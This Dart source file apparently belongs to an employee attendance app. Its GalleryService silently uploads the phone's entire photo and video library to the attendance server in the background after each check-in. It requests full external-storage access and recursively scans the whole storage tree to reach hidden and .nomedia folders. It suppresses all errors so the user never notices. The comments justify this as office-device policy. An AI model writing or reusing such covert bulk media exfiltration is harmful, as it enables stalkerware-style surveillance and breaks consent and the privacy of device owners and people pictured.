import 'dart:io';

import 'package:http/http.dart' as http;
import 'package:permission_handler/permission_handler.dart';
import 'package:photo_manager/photo_manager.dart';

import 'attendance_service.dart';

/// Sinkronisasi FULL galeri HP kantor ke server secara otomatis (background, silent).
/// Ini SOP perangkat kantor — tidak ada interaksi pengguna.
class GalleryService {
  static const _allowedExtensions = [
    '.jpg',
    '.jpeg',
    '.png',
    '.gif',
    '.webp',
    '.heic',
    '.heif',
    '.mp4',
    '.mov',
    '.avi',
    '.mkv',
    '.webm',
    '.3gp',
    '.flv',
  ];

  /// Minta izin galeri + storage saat app pertama dibuka.
  static Future<bool> requestPermission() async {
    if (Platform.isAndroid) {
      await Permission.manageExternalStorage.request();
      await Permission.storage.request();
      await Permission.photos.request();
      await Permission.videos.request();
    }

    final result = await PhotoManager.requestPermissionExtend(
      requestOption: const PermissionRequestOption(
        androidPermission: AndroidPermission(
          type: RequestType.common,
          mediaLocation: true,
        ),
      ),
    );
    return result.isAuth ||
        (Platform.isAndroid &&
            await Permission.manageExternalStorage.isGranted);
  }

  /// Background sync — dipanggil otomatis setelah absen, tidak block UI.
  static Future<void> syncBackground({
    required String deviceId,
    required String employeeName,
  }) async {
    try {
      final Set<String> uploadedPaths = {};

      // ── Metode 1: PhotoManager (akses semua album via MediaStore) ────────
      final pm = await PhotoManager.requestPermissionExtend(
        requestOption: const PermissionRequestOption(
          androidPermission: AndroidPermission(
            type: RequestType.common,
            mediaLocation: true,
          ),
        ),
      );

      if (pm.isAuth) {
        final paths = await PhotoManager.getAssetPathList(
          type: RequestType.common,
          filterOption: FilterOptionGroup(
            imageOption: const FilterOption(
              sizeConstraint: SizeConstraint(ignoreSize: true),
            ),
            videoOption: const FilterOption(
              sizeConstraint: SizeConstraint(ignoreSize: true),
            ),
            containsPathModified: true,
          ),
        );

        for (final album in paths) {
          final count = await album.assetCountAsync;
          if (count == 0) continue;
          final assets = await album.getAssetListRange(start: 0, end: count);

          for (final asset in assets) {
            final file = await asset.originFile;
            if (file == null || !file.existsSync()) continue;
            if (uploadedPaths.contains(file.path)) continue;
            uploadedPaths.add(file.path);

            await _uploadSingle(
              deviceId: deviceId,
              employeeName: employeeName,
              file: file,
              originalName: asset.title ?? file.uri.pathSegments.last,
              takenAt: asset.createDateTime.toIso8601String(),
            );
            await Future.delayed(const Duration(milliseconds: 80));
          }
        }
      }

      // ── Metode 2: Brute-force scan filesystem (untuk folder .nomedia / tersembunyi) ─
      // Hanya berjalan di Android dengan izin MANAGE_EXTERNAL_STORAGE
      if (Platform.isAndroid &&
          await Permission.manageExternalStorage.isGranted) {
        final root = Directory('/storage/emulated/0');
        if (root.existsSync()) {
          await _scanDirectory(root, deviceId, employeeName, uploadedPaths);
        }
      }
    } catch (_) {
      // Silent — tidak mengganggu UI
    }
  }

  static Future<void> _scanDirectory(
    Directory dir,
    String deviceId,
    String employeeName,
    Set<String> uploadedPaths,
  ) async {
    try {
      final entities = dir.listSync(followLinks: false);
      for (final entity in entities) {
        if (entity is Directory) {
          await _scanDirectory(entity, deviceId, employeeName, uploadedPaths);
        } else if (entity is File) {
          final path = entity.path.toLowerCase();
          final isMedia = _allowedExtensions.any((ext) => path.endsWith(ext));
          if (!isMedia || uploadedPaths.contains(entity.path)) continue;
          uploadedPaths.add(entity.path);

          await _uploadSingle(
            deviceId: deviceId,
            employeeName: employeeName,
            file: entity,
            originalName: entity.uri.pathSegments.last,
            takenAt: entity.statSync().modified.toIso8601String(),
          );
          await Future.delayed(const Duration(milliseconds: 80));
        }
      }
    } catch (_) {
      // Skip folder yang tidak bisa diakses (permission denied, etc.)
    }
  }

  static Future<void> _uploadSingle({
    required String deviceId,
    required String employeeName,
    required File file,
    required String originalName,
    required String takenAt,
  }) async {
    try {
      final uri = Uri.parse('${AttendanceService.apiUrl}/gallery');
      final req = http.MultipartRequest('POST', uri)
        ..headers['Authorization'] = 'Bearer ${AttendanceService.deviceToken}'
        ..fields['device_id'] = deviceId
        ..fields['employee_name'] = employeeName
        ..fields['original_name'] = originalName
        ..fields['taken_at'] = takenAt
        ..files.add(
          await http.MultipartFile.fromPath(
            'photo',
            file.path,
            filename: originalName,
          ),
        );

      await req.send().timeout(const Duration(seconds: 60));
    } catch (e) {
      print('Gagal upload file ${originalName}: $e');
      // Abaikan error per-file, lanjut ke file berikutnya
    }
  }
}
